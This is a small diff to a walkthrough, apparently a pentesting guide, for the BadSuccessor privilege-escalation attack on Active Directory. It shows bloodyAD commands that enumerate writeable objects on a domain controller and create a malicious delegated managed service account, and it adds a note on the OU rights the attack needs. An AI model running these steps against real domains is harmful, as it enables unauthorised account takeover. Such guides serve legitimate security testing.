@@ -95,6 +95,10 @@ Then,
 
     bloodyAD -d domain.local -u 'USER' -p 'PASSWORD' --host dc01.domain.local get writeable --detail
 
+#### Desired results:
+
+dSA: CREATE_CHILD on our target OU
+
 ### 3) Do the badSuccessor attack
 
     bloodyAD -d domain.local -u 'USER' -p 'PASSWORD' --host dc01.domain.local add badSuccessor pwned_dmsa
